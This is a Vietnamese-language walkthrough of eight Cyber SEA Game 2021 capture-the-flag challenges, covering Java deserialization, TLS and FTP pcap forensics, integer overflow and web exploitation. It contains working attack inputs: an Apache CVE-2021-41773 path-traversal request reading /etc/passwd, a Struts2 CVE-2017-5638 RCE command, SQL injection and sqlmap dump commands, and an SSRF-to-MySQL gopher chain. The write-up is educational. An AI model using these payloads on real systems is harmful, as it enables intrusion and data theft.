# Cyber SEA Game 2021 — Lời giải chi tiết (Tiếng Việt)

> Tổng hợp & viết lại từ writeup của đội **Nandy Narwhals**:
> https://nandynarwhals.org/cyberseagame-2021/
>
> Mục tiêu của tài liệu này là giải thích lại từng bài **dễ hiểu cho người mới**:
> giải thích thuật ngữ, lý do (tại sao) chứ không chỉ liệt kê thao tác.

---

## 1. Tổng quan giải

**Cyber SEA Game (CSG)** là cuộc thi an ninh mạng (CTF — Capture The Flag) dành cho các đội trẻ
đến từ các nước **ASEAN** (do Nhật Bản / ASEAN-Japan phối hợp tổ chức). CTF là dạng thi mà mỗi
thử thách (challenge) giấu một chuỗi bí mật gọi là **flag** (ở giải này có dạng `flag{...}`);
giải được bài tức là tìm ra flag đó và nộp lên để lấy điểm.

Writeup gốc bao gồm **8 thử thách** thuộc nhiều mảng khác nhau:

| # | Tên challenge | Category (phân loại) | Flag |
|---|---------------|----------------------|------|
| 1 | Object | Reverse / Deserialization | `flag{1434978065}` |
| 2 | Known Vulnerability 1 | Web (CVE công khai) | `flag{N_oht_jnf_perngrq}` |
| 3 | Known Vulnerability 2 | Web (CVE công khai) | `flag{Fbzrqnl_vg_jvyy_or_hahfrq}` |
| 4 | CDN | OSINT / Network | `flag{akamai}` |
| 5 | Unlock | Forensics (giải mã TLS) | `flag{cf8236571e9dd3bcaf44b188bba4f15d}` |
| 6 | Mod | Reverse Engineering | `flag{Something_happens_when_exceeds_limit_value}` |
| 7 | Backend | Web / SSRF / SQLi | `flag{e9ces9p4z9jrai9c3zrs}` |
| 8 | Way | Forensics (FTP trong pcap) | `flag{It's_dangerous_to_use_FTP}` |

**File đề đã tải về** (nằm trong các thư mục con cạnh file này):

- `Object/dataFile_e3347688032cb381a44796d46232ab9d` — dữ liệu Java serialized (82 byte)
- `Unlock/64ef3b043d56cbbb8f873cfa96cd3e4e.zip` — bộ cấu hình HTTPd + chứng chỉ + pcap (~1.8 MB)
- `Mod/mod_e2b191e6b2bb80471d8c4cdb96002207.zip` — file thực thi Windows (`.exe`)
- `Mod/mod_b8848652bef5d195b8d98fe880057d73.cp` — mã nguồn C++ (bị che một phần)
- `Way/Way_8688e1a1263c414450b12985e0d5620b.pcapng` — gói bắt mạng (packet capture)

> **An toàn:** Các bài Reverse (Object, Mod) có file `.exe`. Tài liệu này **chỉ phân tích tĩnh**
> (đọc mã nguồn, xem hexdump) và **không chạy** file nhị phân nào.

---

## 2. Object

**Category:** Reverse / Java Deserialization
**Flag:** `flag{1434978065}`

### Đề bài
Đề cho một file dữ liệu (không có mô tả). Lệnh `file` cho biết đây là *Java serialization data*.

### Giải thích thuật ngữ
- **Serialization (tuần tự hoá):** biến một đối tượng trong bộ nhớ thành một chuỗi byte để lưu
  file / gửi qua mạng. **Deserialization** là quá trình ngược lại: dựng lại đối tượng từ chuỗi byte.
- Dữ liệu Java serialized luôn bắt đầu bằng **magic bytes `AC ED`** (số thứ tự phiên bản `00 05`).

### Phân tích (từng bước)
Xem hexdump của file (`Object/dataFile_...`):

```
00000000: aced 0005 7372 000e 6a61 7661 2e6c 616e  ....sr..java.lan
00000010: 672e 4c6f 6e67 3b8b e490 cc8f 23df 0200  g.Long;.....#...
00000020: 014a 0005 7661 6c75 6578 7200 106a 6176  .J..valuexr..jav
00000030: 612e 6c61 6e67 2e4e 756d 6265 7286 ac95  a.lang.Number...
00000040: 1d0b 94e0 8b02 0000 7870 0000 0000 5588  ........xp....U.
00000050: 0711                                     ..
```

Đọc ra được:
- `aced 0005` → đúng là Java serialized.
- `7372` (`sr`) = **TC_OBJECT + TC_CLASSDESC**: khai báo một class.
- Chuỗi `java.lang.Long` → đối tượng là một **Long** (số nguyên 64-bit).
- Trường tên `value`, kiểu `J` (ký hiệu JVM cho `long`).
- Class cha là `java.lang.Number`.
- 8 byte giá trị ở cuối: `00 00 00 00 55 88 07 11`.

Giá trị `0x0000000055880711` = **1434978065** (hệ thập phân).

### Lời giải chi tiết
**Cách 1 — đọc trực tiếp từ hexdump (tĩnh, an toàn nhất).**
8 byte cuối chính là giá trị `long`. Chuyển `0x55880711` sang thập phân:

```python
>>> 0x55880711
1434978065
```

**Cách 2 — viết chương trình Java để deserialize (như writeup gốc):**

```java
import java.io.*;
public class Solve {
    public static void main(String[] args) throws Exception {
        // ObjectInputStream đọc chuỗi byte và dựng lại đối tượng Java
        ObjectInputStream in =
            new ObjectInputStream(new FileInputStream("dataFile_..."));
        Object o = in.readObject();   // dựng lại thành một Long
        System.out.println(o);        // in ra: 1434978065
    }
}
```

Giá trị thu được chính là nội dung flag.

### Flag
```
flag{1434978065}
```

---

## 3. Known Vulnerability 1

**Category:** Web — khai thác lỗ hổng công khai (CVE)
**Flag:** `flag{N_oht_jnf_perngrq}`

### Đề bài
Một web server chạy trên **cổng 8081**. Nhiệm vụ: tìm flag.

### Phân tích
Xem header phản hồi của server, phát hiện phiên bản **Apache 2.4.49**. Phiên bản này dính
**CVE-2021-41773** — lỗi **Path Traversal** (đi ngược thư mục) dẫn tới đọc file tuỳ ý và có thể RCE.

- **Path Traversal:** dùng chuỗi `../` để thoát ra khỏi thư mục web, truy cập file hệ thống
  (ví dụ `/etc/passwd`). Apache 2.4.49 mã hoá sai dấu `.` nên chặn `../` không hiệu quả: kẻ tấn
  công dùng `%2e` (bản URL-encode của dấu chấm) để vượt qua.

### Lời giải chi tiết
Dùng PoC công khai (của Lucas Souza, exploit-db #50383) để đọc `/etc/passwd`. Payload điển hình:

```
GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```

hoặc dạng curl:

```bash
curl 'http://TARGET:8081/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
```

Server trả về nội dung `/etc/passwd`. Flag nằm trong **trường GECOS** (trường mô tả/tên đầy đủ
của người dùng, cột thứ 5 trong mỗi dòng của `/etc/passwd`).

Flag trông bị "xáo chữ" vì được mã hoá bằng **ROT13** (dịch mỗi chữ cái 13 vị trí). Giải ROT13
`flag{N_oht_jnf_perngrq}` → `flag{A_bug_was_created}`, nhưng flag hợp lệ nộp lên là bản ROT13:

### Flag
```
flag{N_oht_jnf_perngrq}
```

---

## 4. Known Vulnerability 2

**Category:** Web — khai thác lỗ hổng công khai (CVE)
**Flag:** `flag{Fbzrqnl_vg_jvyy_or_hahfrq}`

### Đề bài
Một web server chạy trên **cổng 8080**, là trang **Struts2 Showcase** (ứng dụng demo của framework
Apache Struts2 viết bằng Java).

### Phân tích
Dùng script NSE của **Nmap** để quét, phát hiện dính **CVE-2017-5638** — lỗ hổng RCE kinh điển
của Struts2.

- **RCE (Remote Code Execution):** thực thi lệnh từ xa trên máy chủ.
- CVE-2017-5638 nằm ở bộ phân tích phần `Content-Type` của HTTP: Struts2 dùng thư viện Jakarta
  Multipart và **đánh giá (evaluate)** giá trị `Content-Type` như một biểu thức **OGNL**. Nếu
  nhét một biểu thức OGNL độc hại vào header `Content-Type`, server sẽ chạy nó → ta ép server
  thực thi lệnh shell.

Quét nhanh bằng Nmap:
```bash
nmap -p8080 --script http-vuln-cve2017-5638 TARGET
```

### Lời giải chi tiết
Dùng công cụ công khai **struts-pwn** (của mazen160) nhắm vào endpoint showcase:

```bash
python struts-pwn.py --url 'http://TARGET:8080/showcase.action' \
                     --exploit -c 'cat /flag* ; cat /etc/flag ; ...'
```

Công cụ bơm payload OGNL qua header `Content-Type` để chạy lệnh in nội dung file flag. Trong quá
trình chạy, tool báo lỗi *chunked-encoding* nhưng **flag vẫn hiện ra trong output**.

Flag cũng được **ROT13**: `flag{Fbzrqnl_vg_jvyy_or_hahfrq}` → `flag{Someday_it_will_be_unused}`.
Bản hợp lệ để nộp là bản gốc:

### Flag
```
flag{Fbzrqnl_vg_jvyy_or_hahfrq}
```

---

## 5. CDN

**Category:** OSINT / Network
**Flag:** `flag{akamai}`

### Đề bài
Xác định **CDN** nào đang phục vụ cho host `jpn.nec.com`.

### Giải thích thuật ngữ
- **CDN (Content Delivery Network):** mạng lưới máy chủ phân tán, đặt gần người dùng để tăng tốc
  tải nội dung. Khi một website dùng CDN, tên miền của nó thường **CNAME** (trỏ bí danh) tới tên
  miền của nhà cung cấp CDN.

### Phân tích & lời giải
Chỉ cần phân giải tên miền (DNS) là thấy nó trỏ về domain của CDN:

```bash
ping jpn.nec.com
# → e13694.b.akamaiedge.net  (125.252.231.135)
```

Tên `akamaiedge.net` thuộc về **Akamai** — một trong những nhà cung cấp CDN lớn nhất thế giới.
(Có thể xác nhận thêm bằng `dig jpn.nec.com` hoặc `nslookup` để thấy bản ghi CNAME.)

### Flag
```
flag{akamai}
```

---

## 6. Unlock

**Category:** Forensics — giải mã phiên TLS từ pcap
**Flag:** `flag{cf8236571e9dd3bcaf44b188bba4f15d}`

### Đề bài
File đề là một **zip** chứa: cấu hình HTTPd của CentOS (`etc/httpd/...`), nhiều **chứng chỉ &
khoá riêng** (`etc/pki/...`, các file `key3.db`/`key4.db`), và một bản bắt gói `unlock.pcapng`.
Flag được một web server trả về qua **HTTPS**.

### Giải thích thuật ngữ
- **pcap/pcapng:** file ghi lại toàn bộ gói tin mạng, mở bằng **Wireshark**.
- **TLS/HTTPS:** HTTP có mã hoá. Nội dung bị mã hoá nên không đọc trực tiếp trong pcap được.
- **RSA key exchange:** một kiểu trao khoá TLS cũ. Với kiểu này, "pre-master secret" được client
  mã hoá bằng **khoá công khai** của server và gửi đi. Ai có **khoá riêng (private key)** của
  server thì giải mã được, từ đó giải mã toàn bộ phiên. (Khác với ECDHE có *forward secrecy* —
  chỉ có private key là không đủ.)

### Phân tích (từng bước)
1. Liệt kê nội dung zip:
   ```bash
   unzip -l 64ef3b043d56cbbb8f873cfa96cd3e4e.zip
   ```
   Thấy `etc/httpd/conf/httpd.conf`, thư mục `etc/pki/` chứa khoá & chứng chỉ, CSDL khoá NSS
   (`cert8.db`, `key3.db`, ...), và pcap.
2. Mở pcap trong Wireshark → *Statistics → Protocol Hierarchy*: có cả **HTTP thường** lẫn **TLS**.
3. *Follow HTTP Stream*: một client **Wget/1.17.1** xin `GET /flag.txt` từ `192.168.1.111`.
   Server **Apache 2.2.15 (CentOS)** trả về **302 redirect** sang chính đường dẫn đó nhưng qua
   **HTTPS**. → Nội dung flag nằm ở phiên HTTPS đã bị mã hoá.
4. Vì đề **cố tình cho cả private key**, đây là gợi ý: dùng key để giải mã TLS.
   ```bash
   find etc | grep key     # → server.key, localhost.key, key3.db, key4.db
   ```

### Lời giải chi tiết
Trong Wireshark: *Preferences → Protocols → TLS → RSA keys list*, thêm một mục:

- **IP:** `192.168.1.111`
- **Port:** `443`
- **Protocol:** `http`
- **Key file:** `etc/pki/tls/certs/server.key`

Vì phiên dùng **RSA key exchange**, private key của server giải mã được session key. Sau khi thêm,
*Follow HTTP Stream* cho phiên HTTPS: server trả **200 OK** với nội dung text chứa flag.

> Ghi chú: Tác giả phát hiện bài này **tái sử dụng từ CSG 2019**; writeup của một đội Thái Lan năm
> 2019 cũng cho ra cùng flag này.

### Flag
```
flag{cf8236571e9dd3bcaf44b188bba4f15d}
```

---

## 7. Mod

**Category:** Reverse Engineering — tràn số nguyên (integer overflow)
**Flag:** `flag{Something_happens_when_exceeds_limit_value}`

### Đề bài
Đề cho một **file .exe** (Windows) và một **mã nguồn C++ bị che một phần** (`.cp`). Chương trình
hỏi một con số rồi báo số đó **chẵn hay lẻ**. Flag nằm trong một nhánh của hàm `GetFlag` đã bị xoá
khỏi mã nguồn, chỉ chạy khi input thoả điều kiện đặc biệt.

### Phân tích mã nguồn
Mã nguồn (đã khôi phục từ file `.cp`, lược trọng tâm):

```cpp
int InputNumber() {
    char innum[11] = "";
    int num;
    bool f;
    while (true) {
        num = 0; f = false;
        cin >> innum;
        for (int i = 0; i < sizeof(innum); i++) {
            if (innum[i] > 0) {
                if (!(innum[i] >= '0' && innum[i] <= '9')) {  // chỉ nhận chữ số
                    cout << "Input number only."; f = false; break;
                } else {
                    int j = innum[i] - '0';
                    num = num * 10 + j;   // dựng số nguyên có dấu (signed int)
                    f = true;
                }
            }
        }
        if (f == true) return num;
    }
}

std::string GetFlag(int key) {
    std::string val = "";
    if (key * 2 == 2) {          // điều kiện mở khoá flag
        <<Deleted>>              // nhánh in flag đã bị xoá khỏi đề
    } else {
        val = "Close! Please enter close to the limit value to get a flag.";
    }
    return val.c_str();
}

int main() {
    int num = InputNumber();
    std::string msg;
    if (num % 2 == 0)       msg = "The number you input is even.\n";
    else if (num % 2 == 1)  msg = "The number you input is odd.\n";
    else                    msg = GetFlag(num);   // chỉ tới đây khi num % 2 KHÁC 0 và 1
    printf("%s\n", msg.c_str());
}
```

**Điều kiện để chạm được `GetFlag` rồi mở khoá flag:**
1. `num % 2` phải **khác cả 0 lẫn 1** → chỉ còn khả năng `num % 2 == -1`. Trong C/C++, số **âm lẻ**
   cho phần dư âm, ví dụ `-3 % 2 == -1`. Vậy `num` phải là một **số âm lẻ**.
2. Nhưng `InputNumber` chỉ nhận **chữ số** (không nhận dấu `-`), nên trực tiếp không nhập số âm được.
3. Trong `GetFlag`, cần `key * 2 == 2`, tức là sau khi nhân đôi (có tràn số) phải ra đúng `2`.

**Chìa khoá: Integer Overflow (tràn số nguyên).**
`num` là `int` 32-bit có dấu, tối đa `2147483647` (0x7FFFFFFF). Nếu nhập số lớn hơn, nó **tràn**
và cuộn vòng (wrap-around) thành số âm.

- Chọn `num = 2147483649` (= 2³¹ + 1 = `0x80000001`). Dù ta gõ số dương, khi gán vào `int` 32-bit
  nó biểu diễn thành **-2147483647** → là **số âm lẻ** → `num % 2 == -1` → bỏ qua nhánh chẵn/lẻ,
  rơi vào `GetFlag`.
- Trong `GetFlag`: `key * 2` = `2147483649 * 2` = `4294967298` = `0x1_0000_0002`. Cắt còn 32-bit →
  `0x00000002` = **2**. Vậy `key * 2 == 2` **đúng** → mở khoá flag.

Kiểm chứng bằng Python:
```python
(0xffffffff + 3) // 2            # = 2147483649  (giá trị cần nhập)
import ctypes
ctypes.c_int32(2147483649 * 2).value   # = 2   → thoả key*2 == 2
ctypes.c_int32(2147483649).value       # = -2147483647 → âm lẻ, % 2 == -1
```

### Lời giải chi tiết
Chạy chương trình và nhập **`2147483649`**. Nhờ tràn số, chương trình đi vào nhánh bí mật của
`GetFlag` và in flag. (Trong tài liệu này ta không chạy `.exe`; kết luận rút ra bằng phân tích tĩnh.)

### Flag
```
flag{Something_happens_when_exceeds_limit_value}
```

---

## 8. Backend

**Category:** Web — chuỗi khai thác: bypass login → SQLi → SSRF (gopher) → MySQL
**Flag:** `flag{e9ces9p4z9jrai9c3zrs}`

Đây là bài khó nhất, kết hợp nhiều kỹ thuật. Mục tiêu: `http://176.32.76.86:80`.

### Giải thích thuật ngữ
- **SSRF (Server-Side Request Forgery):** ép **server** gửi request thay cho ta, tới các địa chỉ
  mà ta không trực tiếp với tới được (ví dụ dịch vụ nội bộ chỉ nghe trên mạng LAN của server).
- **Gopher protocol:** một giao thức cổ. cURL hỗ trợ `gopher://` cho phép **gửi byte thô qua TCP**.
  Nhờ đó, qua một SSRF biết dùng cURL, ta có thể "nói chuyện" với **bất kỳ dịch vụ TCP nào** (MySQL,
  Redis...) bằng cách tự dựng gói nhị phân của giao thức đó.

### Phân tích & lời giải (từng bước)

**Bước 1 — Do thám (recon).** `GET /` trả về form đăng nhập với username `user1`. Trong HTML có
comment gợi ý mật khẩu `1234`. Header cho biết **nginx/1.21.4** và **PHP/5.6.40**.

**Bước 2 — Kiểm tra độ dài.** Gửi `password=1234` tới `index.php` → báo mật khẩu phải **≥ 6 ký tự**.

**Bước 3 — Bypass độ dài.** Gửi `password=1234++`. Trong *form-urlencoding*, dấu `+` nghĩa là **dấu
cách**, nên server nhận `"1234  "` (1234 + 2 khoảng trắng) — đủ 6 ký tự, qua được kiểm tra độ dài.
Có vẻ server **trim** (cắt khoảng trắng) trước khi so sánh nên `"1234  "` vẫn khớp `1234`. Server
trả **302** sang `success.php` và cấp cookie phiên mới.

**Bước 4 — Trang sau đăng nhập.** `success.php` là trang "System Monitoring", có link tới
`apidoc.php`. JavaScript inline gọi `http://176.32.76.86:5000/list?type=www`, rồi POST host nhận
được tới `http://176.32.76.86:5000/host/curl`.

**Bước 5 — Đọc tài liệu API.** `apidoc.php` mô tả `GET /list` (cổng 5000): nhận tham số `type`, trả
về một dòng gồm ID, host, port, DB user, tên DB, loại DB, và một chuỗi credential.

**Bước 6 — SQL Injection ở tham số `type`.** Payload (đã URL-encode) tiêm vào `type`:
```
/list?type='OR'1'%3d'1'+AND+ID%3d2%3b--
```
Giải mã: `type=' OR '1'='1' AND ID=2;--` — bẻ dấu nháy, thêm điều kiện luôn đúng `'1'='1'`, lọc
`ID=2`, rồi `;--` để kết thúc/comment phần câu lệnh phía sau. Kết quả trả về đúng **dòng ID = 2**.

**Bước 7 — Dump CSDL bằng sqlmap.** Backend là **SQLite**, bảng `items`:
```bash
sqlmap -u "http://176.32.76.86:5000/list?type=www" --batch --dump -T items
```

| id | port | host | user | pass | dbname | hosttype | tablename |
|----|------|------|------|------|--------|----------|-----------|
| 1 | 80   | 176.32.76.86 | | | | www | |
| 2 | 3306 | mysql | lara | secretsecret | ctf | mysql | ctf |
| 3 | 3306 | mysql | root | *(trống)* | ctf | mysql | flag |

Phát hiện quan trọng: có host nội bộ tên **`mysql`** chạy **MySQL cổng 3306**; CSDL `ctf` có bảng
**`flag`**; tài khoản **`root` không có mật khẩu**.

**Bước 8 — Xác nhận SSRF.** Endpoint `/host/curl` nhận JSON `{"host": "..."}` rồi dùng cURL tải địa
chỉ đó và trả nội dung về. Thử gửi chính địa chỉ web server → nhận lại trang login ⇒ đúng là SSRF.

**Bước 9 — Gửi TCP thô qua gopher.** cURL hỗ trợ `gopher://`:
```json
{"host": "gopher://176.32.76.86:80/_GET / HTTP/1.0%0A%0A"}
```
Phản hồi chứa HTTP reply của nginx. Ký tự `_` ngay sau cổng là *item-type* của gopher và bị bỏ,
còn lại đúng `GET`; `%0A%0A` là 2 dòng trống kết thúc HTTP request. ⇒ Ta kiểm soát được byte gửi đi.

**Bước 10 — Dựng gói đăng nhập MySQL bằng gopherus.** Vì `root` không mật khẩu, client có thể
xác thực không cần credential. Dùng **gopherus** sinh payload:
```bash
python2 gopherus.py --exploit mysql
# username: root
# query:    select * from ctf.flag;
```
Gopherus xuất một URL `gopher://` chứa **gói đăng nhập MySQL không mật khẩu** + câu truy vấn.

**Bước 11 — Request cuối.** POST URL gopher đó (đặt host là `mysql:3306`) vào `/host/curl`. Server
(qua SSRF) mở kết nối TCP tới `mysql:3306`, đăng nhập `root`, chạy `select * from ctf.flag;`. Phản
hồi là gói kết quả MySQL thô, trong phần dữ liệu dòng có chứa flag.

### Flag
```
flag{e9ces9p4z9jrai9c3zrs}
```

---

## 9. Way

**Category:** Forensics — khôi phục file truyền qua FTP trong pcap
**Flag:** `flag{It's_dangerous_to_use_FTP}`

### Đề bài
File đề là `Way_...pcapng` — một bản bắt gói mạng.

### Giải thích thuật ngữ
- **FTP (File Transfer Protocol):** giao thức truyền file **không mã hoá**. Username, password và
  dữ liệu đều đi dạng **text rõ**, nên ai bắt được gói sẽ đọc được hết — đúng với thông điệp của flag.
- **FTP active mode (`PORT`):** FTP dùng 2 kênh — kênh lệnh (control) và kênh dữ liệu (data). Ở
  active mode, client gửi lệnh `PORT h1,h2,h3,h4,p1,p2`; **cổng data** = `p1*256 + p2`.

### Phân tích (từng bước)
1. *Protocol Hierarchy* trong Wireshark: gần như toàn bộ là **FTP**.
2. *Follow TCP Stream* kênh lệnh: server là **Microsoft FTP Service**. Client đăng nhập
   `ftpuser` / `Pass#ftp18` (mật khẩu rõ ràng), rồi dùng active mode cho mỗi lần truyền:
   - `LIST` — liệt kê thư mục
   - `TYPE I` — chuyển sang chế độ nhị phân (binary)
   - `RETR FLAG.zip` — tải file zip
   - `RETR passmemo.txt` — tải ghi chú mật khẩu

   Các đối số `PORT ...,78,73` / `...,78,74` / `...,78,77` từ `192.168.11.242` cho ra cổng data
   `78*256+73 = 20041`, `20042`, `20045` — chính là các kênh mang nội dung file.
3. Kênh data của `passmemo.txt` là một bảng nhỏ, ánh xạ `FLAG.zip` ↔ mật khẩu **`Do_you_use_FTP?`**.

### Lời giải chi tiết
Thay vì export thủ công từng file, dùng **binwalk** carve thẳng từ pcap:
```bash
binwalk -e Way_8688e1a1263c414450b12985e0d5620b.pcapng
```
Tạo ra thư mục `_Way_..._.extracted/` chứa **zip có mật khẩu** `10BE.zip` (và một `FLAG.GIF` thô).
Giải nén zip bằng mật khẩu lấy từ `passmemo.txt`:
```bash
unzip 10BE.zip          # nhập mật khẩu: Do_you_use_FTP?
```
Mở `FLAG.GIF` → ảnh hiển thị flag.

### Flag
```
flag{It's_dangerous_to_use_FTP}
```

---

## 10. Tổng kết nhanh các kỹ thuật

| Challenge | Kỹ thuật cốt lõi | Bài học |
|-----------|------------------|---------|
| Object | Đọc Java serialized (magic `ac ed`) | Dữ liệu đơn giản có thể đọc thẳng từ hexdump |
| Known Vuln 1 | CVE-2021-41773 (Apache path traversal) | Luôn kiểm tra phiên bản phần mềm qua header |
| Known Vuln 2 | CVE-2017-5638 (Struts2 OGNL RCE) | Dùng Nmap NSE + tool PoC công khai |
| CDN | Phân giải DNS / CNAME | Tên miền CDN lộ nhà cung cấp |
| Unlock | Giải mã TLS bằng private key (RSA kx) | Có private key + RSA key exchange ⇒ giải mã được pcap |
| Mod | Integer overflow (signed int 32-bit) | Tràn số làm số dương "cuộn" thành số âm |
| Backend | Bypass login → SQLi → SSRF → gopher→MySQL | Chuỗi tấn công nhiều tầng, gopher gửi TCP thô |
| Way | Carve file FTP từ pcap + zip password | FTP không mã hoá ⇒ lộ hết |

*Lưu ý: flag của Known Vulnerability 1 & 2 bị mã hoá ROT13 (giải ra lần lượt là*
`flag{A_bug_was_created}` *và* `flag{Someday_it_will_be_unused}`*), nhưng flag hợp lệ để nộp là bản*
*ROT13 như bảng trên.*
